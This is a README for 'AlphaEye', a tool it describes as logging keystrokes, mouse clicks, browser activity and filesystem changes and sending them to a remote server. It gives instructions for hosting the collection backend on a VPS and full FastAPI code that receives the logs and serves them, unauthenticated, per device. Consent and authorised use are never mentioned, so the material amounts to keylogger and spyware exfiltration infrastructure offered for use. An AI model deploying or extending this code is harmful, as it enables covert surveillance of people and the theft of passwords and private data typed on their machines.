
# AlphaEye

![alt text](img.png)

## Table of Contents
- [Introduction](#introduction)
- [Direct Login](#direct-login)
- [Usage](#usage)
- [File Storage](#file-storage)
- [Log File](#log-file)
- [Directory Structure](#directory-structure)
- [API Hosting](#api-hosting)
- [Understanding FastAPI](#understanding-fastapi)
- [API:app](#apiapp)
- [main:app](#mainapp)

## Introduction

AlphaEye is a comprehensive monitoring tool designed for capturing and logging user and system activities. This application tracks keystrokes, mouse clicks, browser activities, and filesystem changes, sending logs to a server for storage and analysis.

## Direct Login

Start by running the API server to handle incoming logs and display stored log files:



## Usage

1. **Install the required packages**:
    ```bash
    pip install -r requirements.txt
    ```

2. **Run the API servers**:
    ```bash
    nohup uvicorn API:app --host <host-ip> --port 60000 >> Api_logs.txt 2>&1 &
    nohup uvicorn main:app --host <host-ip> --port 60001 >> logs.txt 2>&1 &
    ```

3. **Run the AlphaEye script**:
    ```bash
    python AlphaEye.py
    ```

## File Storage

Logs are stored in the `logs` directory, with each device's logs saved in a separate file named after the device's hostname.

## Log File

Log entries are sent to the server and appended to the appropriate device's log file. Logs include detailed information on user activities and system events.

## Directory Structure

The project directory is organized as follows:

```
sako-alpha/
├── API/
│   ├── API.py
│   ├── main.py
├── AlphaEye.py
├── 2.ico
├── img1.png
├── README.md
├── requirements.txt
└── logs/
    └── (log files)
```

## API Hosting

To host the API on a server or VPS, follow these steps:

1. **Set up a VPS**: You can use services like AWS, DigitalOcean, or any other VPS provider. Set up a new VPS instance and ensure you have SSH access.

2. **Install dependencies**:
    ```bash
    sudo apt update
    sudo apt install python3-pip
    pip install fastapi uvicorn
    ```

3. **Upload your project files**: Use SCP or any file transfer method to upload your project files to the VPS.

4. **Run the API servers**:
    ```bash
    nohup uvicorn API:app --host <vps-ip> --port 60000 >> Api_logs.txt 2>&1 &
    nohup uvicorn main:app --host <vps-ip> --port 60001 >> logs.txt 2>&1 &
    ```

5. **Access the API**: You can access the API using the VPS IP address. Replace `<vps-ip>` with the actual IP address of your VPS.

## Understanding FastAPI

FastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.7+ based on standard Python type hints. Here are some key features:

- **Fast**: Very high performance, on par with NodeJS and Go (thanks to Starlette and Pydantic). One of the fastest Python frameworks available.
- **Fast to code**: Increase the speed to develop features by about 200% to 300%. *
- **Fewer bugs**: Reduce about 40% of human (developer) induced errors. *
- **Intuitive**: Great editor support. Completion everywhere. Less time debugging.
- **Easy**: Designed to be easy to use and learn. Less time reading docs.
- **Short**: Minimize code duplication. Multiple features from each parameter declaration.
- **Robust**: Get production-ready code. With automatic interactive documentation.
- **Standards-based**: Based on (and fully compatible with) the open standards for APIs: OpenAPI and JSON Schema.

* estimation based on internal benchmarks

### Example of FastAPI Usage

Below are snippets from the `API.py` and `main.py` files demonstrating the use of FastAPI to create a logging API:

## API:app

The `API.py` file defines an API to receive and save logs from the AlphaEye script:

```python
from fastapi import FastAPI, Form
import os

app = FastAPI()

@app.post("/api_alpha")
async def create_log(log: str = Form(...), device_name: str = Form(...)):
    device_name = ''.join(e for e in device_name if e.isalnum() or e in ['_', '-'])
    log_file_path = f'logs/{device_name}.txt'

    if not os.path.exists('logs'):
        os.makedirs('logs')

    with open(log_file_path, "a") as file:
        file.write(log + "\n")

    return {"status": "Log saved"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=60000)
```

## main:app

The `main.py` file defines the main FastAPI application to serve log files and provide a WebSocket for real-time updates:

```python
from fastapi import FastAPI, HTTPException, WebSocket
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from os import listdir
from os.path import isfile, join
import asyncio

app = FastAPI()

logs_dir = "logs"

app.mount("/logs", StaticFiles(directory="logs"), name="logs")

websocket_clients = set()

async def broadcast_file_list():
    files = [f for f in listdir(logs_dir) if isfile(join(logs_dir, f))]
    message = {"type": "file_list", "files": files}
    closed_clients = set()
    for client in websocket_clients:
        try:
            await client.send_json(message)
        except Exception as e:
            print(f"Error sending message to client: {e}")
            closed_clients.add(client)
    for client in closed_clients:
        websocket_clients.remove(client)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    websocket_clients.add(websocket)
    try:
        await broadcast_file_list()
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        print(f"WebSocket error: {e}")
    finally:
        websocket_clients.remove(websocket)

@app.get("/", response_class=HTMLResponse)
async def read_root():
    return """
    <html>
        <head>
            <title>Logs</title>
        </head>
        <body>
            <h1>Welcome to the logs API!</h1>
            <ul id="files"></ul>
            <script>
                const socket = new WebSocket('ws://localhost:60001/ws');
                socket.onmessage = function(event) {
                    const data = JSON.parse(event.data);
                    if (data.type === "file_list") {
                        const filesList = document.getElementById("files");
                        filesList.innerHTML = "";
                        data.files.forEach(function(file) {
                            const li = document.createElement("li");
                            const a = document.createElement("a");
                            a.href = "/logs/" + file;
                            a.textContent = file;
                            li.appendChild(a);
                            filesList.appendChild(li);
                        });
                    }
                };
            </script>
        </body>
    </html>
    """

@app.get("/logs/{file_name}")
async def read_log(file_name: str):
    file_path = join(logs_dir, file_name)
    if not isfile(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=60001)
```
## Contributors

- [@RozaSako](https://github.com/RozaSako)
- [@qays3](https://github.com/qays3)
